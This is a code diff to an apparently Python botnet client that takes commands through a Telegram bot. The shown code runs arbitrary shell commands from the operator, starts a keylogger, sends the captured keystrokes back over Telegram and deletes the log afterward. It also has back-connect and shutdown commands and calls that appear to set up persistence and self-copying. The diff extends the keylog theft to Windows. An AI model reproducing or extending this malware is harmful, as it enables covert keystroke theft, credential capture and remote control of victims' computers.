@@ -11,7 +11,7 @@ from socket import *
 from requests import post
 from bs4 import BeautifulSoup
 from pynput.keyboard import Listener
-
+from getpass import getuser
 
 # TODO this is core of our botNet and not complete yet
 
@@ -127,8 +127,8 @@ if __name__ == "__main__":
     info = info[0:3] + info[4:]
     start_up()
     auto_copy()
-    admin = 00000000  # add admin id here
-    token = "xxxxxx"  # add token here
+    admin = 0000000000              # add admin id here
+    token = "yourTelegramBotToken"  # add token here
     while True:
         finalResult = getting_func()
         data = loads(finalResult)["result"][-1]["message"]["text"]
@@ -154,14 +154,15 @@ if __name__ == "__main__":
             res = str(check_output(command, shell=True))[2:-1]
             message = str(info) + "_res=" + res
             message_func(message, sender)
-        elif data[0:5] == "/keys" and admin == sender:
+        elif data[0:5] == "/keys" and admin == sender:  # TODO test it
             if platform.system() == "Linux":
-                log_dir = "/root/Documents/"
+                user = getuser()
+                log_dir = "/" + str(user) + "/Documents/"
                 key_logger(log_dir)
             else:
                 user = node()
                 user = user.replace("-PC", "")
-                log_dir = "c:/Users/{}/Documents/".format(user)
+                log_dir = "c:/Users/" + str(user) + "/Documents/"
                 key_logger(log_dir)
         elif data[0:12] == "/backConnect" and admin == sender:  # TODO handle errors & add this for windows platform
             if platform.system() == "Linux":
@@ -186,9 +187,8 @@ if __name__ == "__main__":
             else:
                 pass
         elif data[0:9] == "/downKeys" and admin == sender:
-            if platform.system() == "Linux":  # TODO handle {no such file error} & add for windows
-                user = node()
-                user = user.replace("-PC", "")
+            if platform.system() == "Linux":  # TODO handle {no such file error} & test for windows
+                user = getuser()
                 command = "less /" + str(user) + "/Documents/klg.txt"
                 res = str(check_output(command, shell=True))[2:-1]
                 message = str(info) + "_keys=" + res
@@ -198,7 +198,16 @@ if __name__ == "__main__":
                 message = str(info) + "_res=" + res + "_logRemoved"
                 message_func(message, sender)
             else:
-                pass
+                user = node()
+                user = user.replace("-PC", "")
+                command = "more /" + str(user) + "/Documents/klg.txt"
+                res = str(check_output(command, shell=True))[2:-1]
+                message = str(info) + "_keys=" + res
+                message_func(message, sender)
+                command = "del /" + str(user) + "/Documents/klg.txt"
+                res = str(check_output(command, shell=True))[2:-1]
+                message = str(info) + "_res=" + res + "_logRemoved"
+                message_func(message, sender)
         elif data[0:9] == "/shutDown" and admin == sender:  # TODO test this command for windows
             message = str(info) + "_i_will_powerOff"
             message_func(message, sender)
